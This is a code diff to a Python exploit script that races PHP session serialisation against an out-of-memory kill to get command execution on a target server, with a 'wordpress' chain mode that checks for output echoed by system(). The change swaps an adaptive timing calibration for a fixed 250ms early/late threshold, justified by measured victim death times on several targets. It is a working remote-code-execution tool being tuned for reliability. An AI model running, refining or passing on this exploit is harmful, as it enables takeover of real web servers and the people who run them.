@@ -58,8 +58,6 @@ P_CARRIER_PROGRESS = 336       # carrier progress record length (fixed layout)
 P_START = P_CARRIER_PROGRESS + len(b"bio|s:") + len(str(lab.L1)) + len(':"')
 H_MIN, H_MAX = 0, 28_000_000   # pressure bracket bounds (h + 4 fillers
                                # must fit below post_max_size)
-FAST_EOF_BOOTSTRAP_MS = 450.   # early/late split until this run has seen
-                               # enough deaths to calibrate its own
 WP_MARKER: str | None = None   # set by exploit() in 'wordpress' chain
                                # mode: success marker echoed by system()
 
@@ -341,7 +339,7 @@ def wait_server(host: str, port: int, timeout: float = 20.0) -> bool:
     return False
 
 
-def _derive(res: dict, eof_times: list[float]) -> tuple[str, float]:
+def _derive(res: dict) -> tuple[str, float]:
     """Map natural signals to a pressure direction.
 
       hit                 -> won (handled by the caller)
@@ -349,14 +347,19 @@ def _derive(res: dict, eof_times: list[float]) -> tuple[str, float]:
                              direction, hold the pressure
       victim timeout      -> the write completed: the limit was never
                              crossed -> pressure too low
-      victim died FAST    -> the OOM struck before/at the write start
-                             (early: pressure too high)
-      victim died SLOW    -> the OOM struck deeper into the rewrite
-                             (late: crossing happened, too far in)
+      victim died <=250ms -> the OOM struck during serialisation, long
+                             before the pwrite finished (early: pressure
+                             too high)
+      victim died > 250ms  -> the death outlived a full serialisation
+                             plus part of the write (late: the crossing
+                             happened, but past the window)
 
-    The fast/slow split calibrates from THIS run's own death times, so
-    it does not encode any host's timing (serialisation takes ~70ms on
-    one host and ~700ms on another).
+    250ms comes from the measured death distributions on every target so
+    far: early deaths land at 7-108ms (a 16MiB serialisation cannot
+    finish faster) and late deaths at >=1.2s. An adaptive split was tried
+    first and collapses when the data clusters - it misclassified the
+    runner's 7-29ms early deaths as late, which thrashed the pressure
+    upward for a whole run.
     """
     if res.get("decode_failed"):
         return "noise", 0.0
@@ -364,12 +367,7 @@ def _derive(res: dict, eof_times: list[float]) -> tuple[str, float]:
         return "nooom", 0.0
     if res.get("victim") in ("eof", "rst"):
         ms = float(res.get("drop_ms") or 0.0)
-        if len(eof_times) >= 2:
-            lo, hi = min(eof_times), max(eof_times)
-            split = lo + (hi - lo) / 3 if hi > lo else FAST_EOF_BOOTSTRAP_MS
-        else:
-            split = FAST_EOF_BOOTSTRAP_MS
-        return ("early", ms) if ms <= split else ("late", ms)
+        return ("early", ms) if ms <= 250.0 else ("late", ms)
     return "noise", 0.0
 
 
@@ -418,7 +416,6 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
     # (its heavy baseline pushes the band down to h in (0, ~1M)).
     MIN_W = 1_000_000 if chain == "wordpress" else 4_000_000
     last_signal = None         # "early" = too high | "low" = too low
-    eof_times: list[float] = [] # this run's victim death times (calibration)
 
     for i in range(1, max_attempts + 1):
         if not wait_server(host, port):
@@ -439,13 +436,10 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
                       f"{res.get('output', '').strip()[:200]!r}")
             return res
 
-        out, when = _derive(res, eof_times)
+        out, _when = _derive(res)
         res["outcome"] = out
         if verbose:
             print(f"    attempt {i}: {res}")
-
-        if out == "early" or out == "late":
-            eof_times.append(when)      # feeds the fast/slow calibration
 
         if out == "early":
             # OOM before the write: pressure too high
